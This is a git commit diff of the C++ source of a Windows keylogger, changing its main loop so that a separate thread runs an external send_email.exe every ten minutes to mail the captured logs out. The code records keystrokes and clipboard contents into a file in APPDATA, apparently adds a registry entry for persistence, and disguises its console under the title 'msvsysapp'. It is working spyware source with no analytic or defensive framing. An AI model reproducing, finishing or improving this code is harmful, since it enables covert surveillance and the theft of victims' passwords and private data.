6de227ed9c03706f26a4496e693275da47969dfb
Fibek <igorfib6@gmail.com>
2019-06-15 02:01:45 +0200

    multithreading, email every 10mins, refactored

--- main.cpp
+++ main.cpp
@@ -6,6 +6,11 @@
 #include "CClip.h"
 #include <ctime>
 #include <string>
+#include "mingw.thread.h"
+#include <chrono>
+
+#define _WIN32_WINNT 0x0501
+
 
 const std::string LogPath = getenv("APPDATA") + std::string("\\logs.dat"); 
 const std::string pymail = getenv("APPDATA") + std::string("\\send_email.exe");
@@ -15,18 +20,19 @@ void sendmail(LPCSTR AppName, LPSTR argv);
 
 int main(int argc, char * argv[])
 {
-	//HWND stealth; // window handler used to hide the outputted console window
-	//AllocConsole();
-	//stealth = FindWindowA("ConsoleWindowClass", NULL);
-	//ShowWindow(stealth, 0);
-	std::fstream logFile, clipFile;
-	KeyLogger k;
-	CClip cp;
-	time_t sysbasetime = time(0);
-	char * date = ctime(&sysbasetime);
-	std::string handle = k.GetWindowTitle();
 	CreateMutex(NULL, TRUE, "8154d1e24f699f5b217f5ebc8c8c823c");
 	if (GetLastError() != ERROR_ALREADY_EXISTS) {
+		//HWND stealth; // window handler used to hide the outputted console window
+		//AllocConsole();
+		//stealth = FindWindowA("ConsoleWindowClass", NULL);
+		//ShowWindow(stealth, 0);
+		std::fstream logFile, clipFile;
+		KeyLogger k;
+		CClip cp;
+		time_t sysbasetime = time(0);
+		char * date = ctime(&sysbasetime);
+		std::string handle = k.GetWindowTitle();
+		std::thread mail (sendmail, path, argv[1]);
 		SetConsoleTitle("msvsysapp");
 		Sleep(500);
 		k.AddREG();
@@ -48,8 +54,6 @@ int main(int argc, char * argv[])
 			k.NUMkeys(logFile);
 			k.SpecialKeys(logFile);
 			cp.GetClipboard(clipFile);
-			
-			sendmail(path, argv[1]);
 		}
 	}
 	system("pause");
@@ -58,31 +62,33 @@ int main(int argc, char * argv[])
 
 void sendmail(LPCSTR AppName, LPSTR argv)
 {
-	STARTUPINFO si; 		//Startup info for CreateProcess()
-	PROCESS_INFORMATION pi;	//Process info for CreateProcess()	
-	ZeroMemory( &si, sizeof(si) );
-	si.cb = sizeof(si);
-	ZeroMemory( &pi, sizeof(pi) );
+	while (true) {
+		std::this_thread::sleep_for(std::chrono::minutes(10)); //sleep this function for 10 minutes
+		STARTUPINFO si;										  //Startup info for CreateProcess()
+		PROCESS_INFORMATION pi;								  //Process info for CreateProcess()
+		ZeroMemory(&si, sizeof(si));
+		si.cb = sizeof(si);
+		ZeroMemory(&pi, sizeof(pi));
 
-
-	// Start the child process. create pass.txt with email & password to work  [email \n passsword]
-	if( !CreateProcess( path,   // path to send_email.exe
-		argv,        // Command line
-		NULL,           // Process handle not inheritable
-		NULL,           // Thread handle not inheritable
-		FALSE,          // Set handle inheritance to FALSE
-		0,              // No creation flags
-		NULL,           // Use parent's environment block
-		NULL,           // Use parent's starting directory 
-		&si,            // Pointer to STARTUPINFO structure
-		&pi )           // Pointer to PROCESS_INFORMATION structure
-	) 
-	{
-		printf( "CreateProcess failed (%d).\n", GetLastError() );
+		// Start the child process. create pass.txt with email & password to work  [email \n passsword]
+		if (!CreateProcess(path,  // path to send_email.exe
+						   argv,  // Command line
+						   NULL,  // Process handle not inheritable
+						   NULL,  // Thread handle not inheritable
+						   FALSE, // Set handle inheritance to FALSE
+						   0,	 // No creation flags
+						   NULL,  // Use parent's environment block
+						   NULL,  // Use parent's starting directory
+						   &si,   // Pointer to STARTUPINFO structure
+						   &pi)   // Pointer to PROCESS_INFORMATION structure
+		)
+		{
+			printf("CreateProcess failed (%d).\n", GetLastError());
+		}
+		// Wait until child process exits.
+		WaitForSingleObject(pi.hProcess, INFINITE);
+		// Close process and thread handles.
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
 	}
-	// Wait until child process exits.
-		WaitForSingleObject( pi.hProcess, INFINITE );
-	// Close process and thread handles. 
-		CloseHandle( pi.hProcess );
-		CloseHandle( pi.hThread ); 
 }
